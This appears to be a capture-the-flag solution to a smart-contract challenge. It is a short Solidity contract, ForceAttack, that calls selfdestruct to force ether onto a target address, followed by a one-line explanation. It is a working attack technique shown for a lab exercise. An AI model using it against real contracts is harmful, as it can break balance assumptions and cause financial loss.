```javascript
pragma solidity ^0.6.0;

contract ForceAttack {
  function attack(address payable addr) public {
      selfdestruct(addr);
  }
}
```

`selfdestruct` to force `eth` onto the contract address.